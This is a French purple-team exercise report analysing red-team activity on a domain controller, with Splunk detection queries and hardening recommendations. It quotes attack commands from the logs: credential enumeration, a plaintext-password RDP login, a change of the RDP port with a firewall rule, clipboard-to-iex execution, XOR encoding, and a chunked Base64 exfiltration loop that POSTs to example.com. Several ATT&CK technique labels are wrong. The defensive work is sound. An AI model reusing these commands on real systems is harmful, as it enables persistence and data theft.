L’événement indique une série de commandes d’énumération des comptes locaux exécutées via PowerShell sur le contrôleur de domaine. L’objectif apparent est de lister les comptes et groupes locaux, les profils utilisateurs présents et les credentials enregistrés localement (cmdkey), renseignements utiles pour préparer mouvement latéral ou escalade de privilèges.
Texte extrait des images :

powershell.exe' &amp; {net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users

Ces commandes permettent de :
net user / get-localuser : énumérer les comptes locaux.


get-localgroupmember -group Users / net localgroup : savoir quels comptes appartiennent aux groupes locaux (ex. Users, Administrators).


cmdkey.exe /list : lister des credentials/stored credentials (potentiellement réutilisables).


ls C:/Users : identifier les profils locaux et potentiels comptes d’intérêt.



Lignes les plus critiques détectées (extraits)
net user


get-localuser


get-localgroupmember -group Users


cmdkey.exe /list


ls C:/Users


Ces lignes montrent clairement une phase de reconnaissance locale centrée sur la découverte d’identifiants et de comptes.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=*
( CommandLine="*net user*" 
  OR CommandLine="*wmic useraccount*"
  OR CommandLine="*Get-LocalUser*"
  OR CommandLine="*net localgroup*"
  OR Image="*\\cmdkey.exe" )
| stats count latest(_time) as last_seen values(host) as hosts values(Account_Name) as users values(ProcessName) as procs values(CommandLine) as commands by host
| sort - last_seen
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Restreindre l’usage d’outils d’énumération sur les serveurs sensibles (AppLocker / WDAC) : bloquer `cmdkey.exe`, empêcher l’exécution de PowerShell interactif non autorisé sur DC.
- Séparer les fonctions d’administration (postes PAW/Jumpbox) et interdire les tâches d’admin depuis des postes génériques.
- Éviter l’usage de comptes locaux administrateurs partagés ; appliquer LAPS pour les mots de passe locaux.
- Interdire le stockage de secrets dans les profils utilisateurs et réduire l’utilisation de `cmdkey` pour comptes à haute sensibilité.

Mesures de détection SIEM / EDR :

- Détecter et alerter sur les séquences `Get-LocalUser` ou `net user` combinées à `cmdkey.exe /list` exécutées depuis un DC.
- Corréler l’exécution de commandes d’énumération avec des accès anormaux (sessions RDP, création de service, exécution de commandes à distance) sur le même intervalle.
- Déclencher des enquêtes automatiques si `cmdkey.exe /list` est exécuté par un compte administratif inhabituel ou hors heures ouvrées.
- Surveiller les accès et lectures du répertoire `C:\Users` depuis des comptes système non attendus.

Durcissement Active Directory / réseau :

- Restreindre la capacité d’exécution distante de PowerShell (ConstrainedLanguage / JEA) sur les contrôleurs de domaine.
- Mettre en place une segmentation réseau stricte : seuls les outils d’administration autorisés peuvent joindre les DC (ACL, firewall interne).
- Appliquer la MFA pour toutes les actions d’administration et sessions à privilèges.
- Activer l’audit renforcé sur les modifications des groupes locaux (EventID corrélés) et lister automatiquement les changements pour revue.
- Déployer LAPS et supprimer les comptes locaux inutiles ; réaliser des revues régulières des membres des groupes privilégiés.


#### Analyse de l'événement : 2025-11-07T10:53:16Z

Connexion RDP distante et modification du port d’écoute RDP.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:53:16  
Hôte concerné : AR-WIN-DC

echo "RDP connection established"}
Analyse des alertes détectées :
Les journaux révèlent une séquence de commandes PowerShell, CMD et Regedit exécutées sur le contrôleur de domaine AR-WIN-DC, indiquant une tentative de connexion à distance via RDP avec des identifiants valides, combinée à une modification du port RDP standard (3389 → 4489). Ces actions traduisent une tentative d’établissement de session distante avec élévation potentielle de privilèges ou contournement de politiques de filtrage réseau.

Preuves extraites (texte visible dans les images et logs Splunk) :

```text
"C:\Windows\system32\mstsc.exe" /v:AR-WIN-DC
"cmd.exe" /c reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f & netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
"powershell.exe" & {$Server=$ENV:logonserver.TrimStart("\\")
$User = Join-Path $Env:USERDOMAIN $ENV:USERNAME
$Password="1password2!"
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo "RDP connection established"}
"powershell.exe" & {Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 4489
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489}
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1 OR EventCode=4104 OR EventCode=4103 OR EventCode=4657)
| eval cmd = coalesce(CommandLine, Process_CommandLine, ScriptBlockText, _raw)
| where isnotnull(cmd)
| regex cmd="(?i)(cmdkey\\s+/generic:TERMSRV|mstsc\\s+/v:|mstsc\\.exe|Set-ItemProperty\\s+-Path\\s+'HKLM:.*\\\\WinStations\\\\RDP-Tcp'|reg\\s+add\\s+\"?HKLM\\\\.*\\\\WinStations\\\\RDP-Tcp\"|New-NetFirewallRule|netsh\\s+advfirewall\\s+firewall\\s+add|UserAuthentication\\s*(?:=|,|\\s)\\s*0|EncodedCommand=)"
| stats count, latest(_time) as last_seen, values(host) as hosts, values(Account_Name) as users, values(ProcessName) as procs, values(cmd) as commands by EventCode
| eval last_seen = strftime(last_seen, "%Y-%m-%d %H:%M:%S")
| sort - last_seen
```

Analyse détaillée :
L’utilisateur a créé une clé d’accès RDP via la commande cmdkey /generic:TERMSRV/... contenant un mot de passe en clair : 1password2!.
Une session RDP a ensuite été établie (mstsc.exe /v:AR-WIN-DC).
Les commandes reg add et Set-ItemProperty ont modifié la clé de registre RDP-Tcp pour forcer le port d’écoute à 4489.
Les règles de pare-feu ont été ajustées pour autoriser ce nouveau port (netsh advfirewall firewall add rule ... localport=4489).

Ce comportement est typique d’une phase de mouvement latéral ou d’une persistance RDP par reconfiguration du service Terminal Server.
 L’acteur établit une session RDP valide, modifie la configuration réseau et enregistre un port non standard pour masquer ses futures connexions.
Criticité : Élevée — exécution locale avec privilèges élevés, modification du registre système et du pare-feu, présence d’un mot de passe stocké en clair.


Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire l’accès RDP direct aux contrôleurs de domaine ; autoriser uniquement via bastion administré ou jump server.
- Appliquer une politique d’authentification forte (MFA) pour toute connexion distante.
- Bloquer la possibilité d’utiliser `cmdkey` pour stocker ou injecter des mots de passe.
- Mettre en place des GPO interdisant la modification du port RDP (`PortNumber`) et des règles pare-feu locales.
- Restreindre les comptes autorisés à modifier le registre `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`.

Mesures de détection SIEM / EDR :

- Créer une règle Splunk pour détecter :
  - la combinaison `reg add` + `RDP-Tcp` + `PortNumber` ;
  - la création de nouvelles règles de pare-feu avec port ≠ 3389 ;
  - toute exécution de `mstsc.exe` après `cmdkey /generic:TERMSRV`.
- Surveiller les modifications du registre (`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`) et tout ajout de règle `RDPPORTLatest-TCP-In`.
- Établir une corrélation entre événements 4104 (PowerShell), 4688 (Process creation) et 4657 (Registry modification).

Durcissement Active Directory / réseau :

- Bloquer le port RDP sur les serveurs sensibles sauf via réseau d’administration dédié.
- Activer Network Level Authentication (NLA) pour empêcher les connexions non authentifiées.
- Appliquer une surveillance continue des ouvertures de ports RDP non standards via pare-feu ou EDR.
- Consigner et auditer les modifications apportées aux clés de registre et règles de pare-feu.


#### Analyse de l'événement : 2025-11-07T10:56:17Z

Tentative de récupération / exécution via le contenu du presse-papier Windows.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:56:17  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
L’évènement montre l’exécution du binaire `clip.exe` permettant d’interagir avec le presse-papier Windows. Ce type d’action peut permettre à un acteur malveillant de collecter des données sensibles présentes dans le clipboard (mots de passe copiés temporairement, secrets API, commandes PowerShell confidentielles, tokens, etc.) ou d’exécuter des commandes en deux étapes (écrire commande → lire clipboard puis exécution).

Preuves visibles dans l’image fournie :

```text
C:\Windows\System32\clip.exe
CommandLine: "cmd.exe" /c echo Get-Process | clip
Get-Clipboard | iex
```

Le parent process est `powershell.exe`, ce qui montre une opération interactive visant à injecter puis exécuter du code directement à partir du clipboard. Cela représente un vecteur d’exécution détourné discret permettant d’éviter certains contrôles de filtrage sur ligne de commande.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1)
Image="*\\clip.exe"
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire l’usage de `clip.exe` sur les DC via AppLocker ou WDAC.
- Éviter la copie de secrets ou de mots de passe dans le presse-papiersur les postes à privilèges.
- Centraliser l’administration AD sur un poste bastion dédié.

Mesures de détection SIEM / EDR :

- Déclencher une alerte lorsque `Get-Clipboard` et `iex` apparaissent dans un même bloc PowerShell.
- Surveiller l’exécution de `clip.exe` depuis `powershell.exe`, en particulier avec un niveau d’intégrité élevé.
- Corréler ces actions avec d’éventuels scénarios de credential dumping ou de manipulation Kerberos dans la même fenêtre temporelle (< 90 secondes).

Durcissement Active Directory / réseau :

- Forcer le Constrained Language Mode sur les DC et limiter PowerShell Full Language Mode.
- Appliquer Just Enough Administration (JEA) pour encadrer les actions interactives.
- Renforcer MFA et la segmentation d’administration (postes PAW).

#### Analyse de l'événement : 2025-11-07T10:58:37Z

Encodage XOR de données potentiellement exfiltrables.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:58:37  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
L’exécution observée indique une tentative d’encodage de données par XOR avant un envoi réseau potentiel. Cette technique vise à masquer des informations sensibles (données internes, chemins systèmes, identifiants, fichiers exfiltrés) afin de contourner les mécanismes de détection basés sur des signatures ou expressions régulières.

Log visible sur l’image :

```text
powershell.exe ; $plaintext = ([System.Text.Encoding]::UTF8.getBytes("Path\n----\nC:\\Users\\victim"));
$key = "abcdefghijklmnopqrstuvwxyz123456"
$cyphertext = @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
```

Ce comportement est typique d’une étape de pré-exfiltration, souvent suivie d’un envoi HTTP POST, d’un tunnel C2 ou d’un canal DNS. L’encodage standardisé facilite le décodage côté attaquant tout en complexifiant l’analyse défensive.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1)
(
  CommandLine="*base64*"
  OR CommandLine="*-enc*"
  OR CommandLine="*-encodedCommand*"
  OR CommandLine="*System.Text.Encoding*"
  OR CommandLine="*FromBase64String*"
  OR CommandLine="*System.Convert::FromBase64String*"
)
| sort _time
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Imposer le Constrained Language Mode sur les DC pour bloquer les scripts PowerShell rich media.
- Interdire l’exécution de scripts inline non signés via AppLocker / WDAC.
- Bloquer l’usage de PowerShell pour des comptes non administratifs sur les serveurs sensibles.

Mesures de détection SIEM / EDR :

- Détecter les combinaisons `-bxor` + boucle modulo (`$i % $key.Length`) dans les ScriptBlock.
- Surveiller l’appel à `System.Text.Encoding` et `ToBase64String` suivi d’une requête réseau (`Invoke-WebRequest`, `curl`, `Invoke-RestMethod`).
- Alerter lorsqu’un script PowerShell encode un contenu puis initie immédiatement une communication sortante.

Durcissement Active Directory / réseau :

- Isoler les DC dans un VLAN d’administration sans accès direct à Internet.
- Bloquer les requêtes HTTP POST sortantes depuis les DC vers des domaines externes.
- Déployer une DLP interne pour détecter les chaînes Base64 ou XOR inhabituelles provenant de serveurs d’infrastructure.

#### Analyse de l'événement : 2025-11-07T11:06:41Z

Exfiltration de données en fragments pour évasion de détection réseau.

Date de l’exercice : 07/11/2025  
Heure UTC : 11:06:41  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Les journaux Sysmon collectés sur AR-WIN-DC indiquent une exécution PowerShell suspecte liée à une tentative d’exfiltration de données en petits fragments (chunking) afin d’éviter les seuils de détection habituels. Le processus lit un fichier local, encode chaque bloc en Base64 puis envoie les données successivement vers un serveur externe via des requêtes HTTP POST.

Preuves extraites :

```text
$file = [System.IO.File]::OpenRead([User specified])
$chunkSize = 1024 * 1KB
$buffer = New-Object Byte[] $chunkSize
while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk
}
$file.Close()
```

Éléments observés dans les logs : `EventID 1` (Sysmon Process Create), parent `powershell.exe`, sous-processus `hostname.exe`, hash `MD5=BE617A36F2ACEB6A89B0646201A93AB8`, canal de transfert `Invoke-WebRequest -Uri <http://example.com> -Method Post -Body $encodedChunk`, encodage `[Convert]::ToBase64String`.

Requête Splunk utilisée pour remonter cet évènement :

```splunk
index=* ("Invoke-WebRequest" OR "Start-BitsTransfer" OR "[System.Net.WebClient]::UploadFile" OR "rex")
NOT (EventID=4104 OR EventID=4105 OR EventID=4106)
| sort _time
```

Interprétation : cette méthode d’exfiltration fragmentée permet de masquer le trafic dans des flux HTTP légitimes et d’échapper aux contrôles volumétriques. Sur un DC, un tel comportement est anormal et suggère une exfiltration de données sensibles en cours.

Criticité : Élevée — transfert probable d’informations critiques avec technique avancée d’évasion réseau.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Restreindre les connexions HTTP/HTTPS sortantes des serveurs critiques via pare-feu ou proxy applicatif.
- Désactiver ou limiter PowerShell interactif sur les hôtes sensibles grâce à AppLocker / WDAC.
- Imposer l’usage de proxys authentifiés et journalisés pour toutes les requêtes web sortantes.
- Bloquer `Invoke-WebRequest`, `Start-BitsTransfer` et `Net.WebClient` pour les comptes non administratifs.

Mesures de détection SIEM / EDR :

- Créer une corrélation Splunk combinant `Invoke-WebRequest` et `[Convert]::ToBase64String` dans un même ScriptBlock.
- Identifier les flux HTTP POST sortants vers des domaines externes à partir des serveurs AD.
- Alerter lorsqu’un script PowerShell lit un fichier avec `[System.IO.File]::OpenRead()` puis initie un transfert réseau.
- Surveiller les séquences Sysmon EventID 1 + 3 (ProcessCreate + NetworkConnect) rattachées à `powershell.exe` et des URI externes.

Durcissement Active Directory / réseau :

- Segmenter le trafic en isolant le réseau d’administration et les DC de toute sortie Internet directe.
- Déployer une solution DLP pour repérer les flux de données sensibles.
- Restreindre les permissions d’exécution PowerShell et privilégier JEA pour les comptes de service.
- Activer le logging complet des modules PowerShell (4104, 4105, 4106) sur l’ensemble du domaine.

- **Retour d'expériences sur les difficultés rencontrées :**

### Red Team — Après-midi

- **Type d'attaques lancées :**
  - 13:45:15 11/07/2025 : Invoke-AtomicTest T1129
    - Description de la technique : T1129 — Shared Modules
: Chargement de modules partagés (DLL/.so) pour exécuter du code malveillant.
      
  - 13:45:59 11/07/2025 : Invoke-AtomicTest T1112
    - Description de la technique : T1112 — Modify Registry : Modification du registre pour persistance ou altération de configuration système.
     
  - 13:52:31 11/07/2025 : Invoke-AtomicTest T1037.001
    - Description de la technique : T1037.001 — Indicator Removal on Host: Clear Windows Event Logs : Suppression ou altération des journaux pour couvrir les traces.

  - 13:53:19 11/07/2025 : Invoke-AtomicTest T1547.001 -ShowDetails
    - Description de la technique : T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder : Persistance via clés Run/RunOnce ou dossiers de démarrage.

  - 14:18:18 11/07/2025 : Invoke-AtomicTest T1622
    - Description de la technique : T1622 — Remote Services: Exploitation (exploitation of remote services) : Exploitation de services exposés pour exécution à distance.
  
  - 14:19:19 11/07/2025 : Invoke-AtomicTest T1187 -ShowDetails
    - Description de la technique : T1187 — Forced Authentication : Forcer une authentification pour récupérer des identifiants ou NTLM challenge/response.

  - 14:21:05 11/07/2025 : Invoke-AtomicTest T1010 -Show Details
    - Description de la technique : T1010 — Application Window Discovery : Rechercher fenêtres d'applications pour cibler UI ou vol de données.

  - 14:22:34 11/07/2025 : Invoke-AtomicTest T1563.002 -ShowDetails
    - Description de la technique : T1563.002 — Remote Service Session Hijacking / RDP Hijacking or Hijack Session : Détournement de sessions distantes existantes pour exécuter actions sans re-authentification.

  - 14:23:21 11/07/2025 : Invoke-AtomicTest T1119 -ShowDetails
    - Description de la technique : T1119 — Automated Collection : Scripts/outils automatisés collectant fichiers et données ciblées.

  - 14:23:39 11/07/2025 : Invoke-AtomicTest T1123 -ShowDetails
    - Description de la technique : T1123 — Audio Capture : Capture audio via périphériques pour espionnage.

  - 14:31:07 11/07/2025 : Invoke-AtomicTest T1030 -ShowDetails
    - Description de la technique : T1030 — Data Transfer Size Limits (exfiltration via chunking?) : Techniques visant à contourner limitations en fractionnant transferts; (selon contexte).

  - 14:33:02 11/07/2025 : Invoke-AtomicTest T1489 -ShowDetails
    - Description de la technique : T1489 — Service Stop : Arrêt de services de sécurité/logging pour perturber la défense.

- **Réponse de la Blue Team :**

- **Axes d'amélioration de la Blue Team par attaque :**

  - T1129 (Shared Modules) : appliquer contrôle d'applications et empêcher le chargement de modules depuis répertoires utilisateur/temp, contrôler intégrité des binaires et surveiller chargements anormaux.

  - T1112 (Modify Registry) : restreindre droits d'écriture sur les clés sensibles, activer alertes SIEM sur nouvelles entrées d'autostart et appliquer contrôle d'intégrité sur le registre.

  - T1037.001 (Clear Windows Event Logs) : centraliser les logs vers un SIEM immuable, restreindre permissions de suppression des journaux et alerter sur opérations de clear/evtx truncation.

  - T1547.001 (Autostart — Run Keys/Startup) : surveiller/inventorier clés Run/Startup, restreindre écriture, utiliser contrôle d'applications et vérifier intégrité des dossiers de démarrage.

  - T1622 (Remote Services Exploitation) : durcir et patcher services exposés, restreindre exposition réseau (firewall/ACL), appliquer WAF/IDS et monitorer tentatives d'exploitation.

  - T1187 (Forced Authentication) : limiter services incitant à des authentifications forcées, bloquer partages non nécessaires, surveiller défis/NTLM et appliquer segmentation réseau.

  - T1010 (Application Window Discovery) : surveiller processus qui listent ou inspectent handles de fenêtres, appliquer EDR pour bloquer sondages UI par processus non autorisés.

  - T1563.002 (Remote Service Session Hijacking) : restreindre et sécuriser sessions RDP, activer timeouts, MFA, journalisation des sessions et détecter comportements anormaux dans sessions existantes.

  - T1119 (Automated Collection) : détecter lectures massives/séquentielles sur répertoires sensibles, limiter accès service-compte et surveiller transferts intermédiaires avant exfiltration.

  - T1123 (Audio Capture) : restreindre accès aux périphériques audio via politiques de sécurité, contrôler permissions d'applications et alerter sur accès non-UI aux interfaces audio.

  - T1030 (Data Transfer Size Limits / chunking) : surveiller flux sortants fragmentés, corréler sessions répétées vers mêmes destinations, appliquer limites et alertes DLP.

  - T1489 (Service Stop) : restreindre droits de Service Control, surveiller arrêts/erreurs de services de sécurité, configurer redondance et alertes sur services critiques stoppés.

### Blue Team — Après-midi

Nous avons globalement détecté 4 actions malveillantes :

- l’énumération agressive des comptes locaux ;
- les téléchargements de charges utiles hébergées sur GitHub ;
- les élévations de privilèges et installations de services ;
- la création anormale de processus et de fichiers par PowerShell.

#### Énumération locale via PowerShell

Une séquence de commandes PowerShell exécutée sur AR-WIN-DC a ciblé l’inventaire des comptes et des secrets locaux afin de préparer un mouvement latéral.

Preuves observées :

```text
powershell.exe' & {net user
Get-LocalUser
Get-LocalGroupMember -Group Users
cmdkey.exe /list
ls C:/Users
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=*
| where like(Image, "%\\powershell.exe") OR like(Image, "%\\pwsh.exe")
| eval suspicious = if(match(CommandLine, "(?i)(-enc|encodedcommand|-nop|-w hidden|-executionpolicy bypass|iex|invoke-)")
                     OR match(CommandLine, "(?i)(net user|get-localuser|get-localgroupmember|cmdkey.exe /list|ls c:/users)"),
                     "Yes", "No")
| where suspicious="Yes"
| table _time host user ParentImage Image CommandLine suspicious
| sort - _time
```

Interprétation : la combinaison de `cmdkey`, `net user` et `ls C:/Users` révèle une collecte automatisée de comptes et de secrets stockés localement. Ce comportement est cohérent avec MITRE ATT&CK T1087/T1003 et nécessite une réponse immédiate.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Restreindre l’exécution interactive de PowerShell sur les contrôleurs de domaine (AppLocker / WDAC + JEA).
- Désactiver `cmdkey.exe` sur les hôtes critiques ou limiter son usage aux comptes de service documentés.
- Mettre en place des postes d’administration dédiés (PAW) pour les tâches AD sensibles.

Mesures de détection SIEM / EDR :

- Créer une corrélation entre `cmdkey.exe /list` et toute commande d’énumération (`net user`, `Get-LocalUser`).
- Élever la criticité si ces commandes sont exécutées par un compte non prévu ou hors des heures ouvrées.
- Déclencher une alerte si une séquence `cmdkey` est suivie d’un accès réseau privilégié (RDP, SMB).

Durcissement Active Directory / réseau :

- Limiter les droits administratifs locaux et appliquer LAPS sur tous les serveurs.
- Segmenter le réseau d’administration et isoler les DC de l’accès utilisateur standard.
- Auditer régulièrement les profils utilisateurs locaux pour s’assurer de l’absence de secrets persistants.

#### Téléchargements suspects depuis GitHub

Les journaux proxy et PowerShell ont montré des téléchargements répétés de scripts hébergés sur GitHub, notamment vers le dépôt Atomic Red Team.

Requête Splunk utilisée :

```splunk
index=*
"github.com" OR "raw.githubusercontent.com"
| search "GET" OR "download"
| stats count values(uri_path) as urls values(host) as hosts by src_ip
| sort - count
```

Résultat clé : activité récurrente vers `https://github.com/redcanaryco/invoke-atomicredteam`, indicateur d’un chargement de tactiques offensives.

Recommandations :

- Filtrer ou mettre en quarantaine les téléchargements de scripts depuis GitHub pour les DC ;
- Documenter et approuver explicitement les dépôts autorisés pour les scripts d’administration ;
- Déployer une alerte haute priorité lorsqu’un DC télécharge du contenu exécutable depuis des forges publiques.

#### Anomalies de privilèges et de services

Les événements Windows (4672, 4728, 4732, 4697, 4698, 4674) ont été agrégés pour identifier des modifications de privilèges ou des créations de services suspectes.

Requête Splunk utilisée :

```splunk
index=* EventCode IN (4672, 4728, 4732, 4697, 4698, 4674)
| eval AlertType=case(
    EventCode=4672, "Special Privileges Assigned",
    EventCode=4728 OR EventCode=4732, "User Added to Group",
    EventCode=4697, "Service Installed",
    EventCode=4698, "Scheduled Task Created",
    EventCode=4674, "Privileged Object Access"
  )
| search AlertType="Special Privileges Assigned"
| stats count values(Account_Name) as comptes values(SubjectUserName) as utilisateurs by AlertType
| sort - count
```

Constat : une même identité se voit attribuer des privilèges spéciaux à plusieurs reprises, signe d’escalade ou d’utilisation abusive de comptes partagés.

Actions recommandées :

- Forcer une revue immédiate des comptes concernés et réinitialiser leurs secrets ;
- Mettre en œuvre des contrôles PAM / JIT afin de limiter la durée d’élévation ;
- Ajouter une détection corrélant attribution de privilèges et installation de service pour bloquer les persistances rapides.

#### Processus et fichiers anormaux générés par PowerShell

Deux recherches complémentaires ont permis d’identifier des processus orphelins et la création de fichiers `.ps1` ou `.dmp` par PowerShell sur AR-WIN-DC.

Requêtes Splunk :

```splunk
index=* EventCode=4688 (Account_Name="AR-WIN-DC$" OR SubjectUserName="AR-WIN-DC$")
| table _time ComputerName Account_Name New_Process_Name Parent_Process_Name New_Process_Id Command_Line
| sort - _time
```

```splunk
index=* Channel="Microsoft-Windows-Sysmon/Operational" host="AR-WIN-DC" EventID=11
| regex _raw!="splunk"
| regex "(?i)(ps1|dmp)"
| table _time EventID EventDescription file_name
| sort - _time
```

Observations : présence de processus sans ligne de commande (indicatif de chargement en mémoire) et production de nombreux fichiers `.ps1`/`.dmp` par `powershell.exe`, cohérents avec la collecte de scripts ou de dumps mémoire.

Mesures correctives :

- Activer Script Block Logging intégral et acheminer les journaux vers le SIEM ;
- Interdire l’écriture de fichiers PowerShell dans les répertoires temporaires des DC ;
- Bloquer la génération de dumps sans autorisation (RunAsPPL, Credential Guard, politiques d’accès à `WerFault`).

Ces actions de la Blue Team durant l’après-midi bouclent le cycle de détection amorcé le matin en renforçant la visibilité sur les activités persistantes de l’adversaire et en préparant des contre-mesures concrètes.